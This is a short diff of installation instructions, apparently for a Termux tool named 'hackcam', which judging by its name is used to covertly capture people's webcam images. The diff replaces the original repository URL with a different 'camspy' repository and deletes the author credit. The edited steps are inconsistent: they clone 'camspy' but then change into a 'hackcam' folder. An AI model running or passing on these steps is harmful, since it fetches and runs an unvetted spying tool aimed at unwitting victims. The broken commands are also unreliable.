@@ -6,9 +6,6 @@ $ pkg install openssh
 $ pkg install bash
 $ pkg install php
 $ cd /sdcard
-$ git clone https://github.com/oxlynx/hackcam
+$ git clone https://github.com/bnsbluss/camspy.git
 $ cd hackcam
 $ bash hackcam.sh
-
-
-Author : OxLynx
